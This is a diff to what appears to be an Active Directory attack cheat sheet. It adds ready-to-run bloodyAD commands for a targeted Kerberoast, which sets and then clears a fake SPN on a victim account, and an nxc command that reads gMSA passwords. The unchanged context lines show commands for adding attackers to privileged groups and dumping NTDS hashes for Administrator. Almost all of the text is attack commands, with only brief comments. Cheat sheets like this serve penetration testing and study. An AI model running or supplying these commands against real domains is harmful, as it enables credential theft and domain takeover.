@@ -97,6 +97,13 @@ bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASSWORD> set password <TARGET
 bloodyAD --host 'dc' -u 'user' -p 'pass' add groupMember 'developers' 'machine1$'
 # cross domain (generic all)
 bloodyAD --host 'dc02.abc' -u 'user' -p ':hash' -d 'domain1' add groupMember 'sysadmins' 'gatari$'
+
+# WriteSPN (Targeted Kerberoast)
+# set SPN
+bloodyAD --host 'dc' -u 'user' -p 'pass' set object 'target' servicePrincipalName -v 'http/pwned'
+# DO Kerberoasting here then unset
+# unset SPN
+bloodyAD --host 'dc' -u 'user' -p 'pass' set object 'target' servicePrincipalName
 ```
 
 
@@ -121,6 +128,11 @@ bloodhound-ce-python -u 'user@domain1' -p 'pass' -d 'domain2' -c 'All' -ns '10.5
 nxc smb dc -u 'user' -H 'hash' --ntds --user 'Administrator'
 ```
 
+## ReadGMSAPassword
+
+```bash
+nxc ldap 10.10.10.10 -u 'user' -p 'pass' --gmsa
+```
 
 ## Time Sync
 
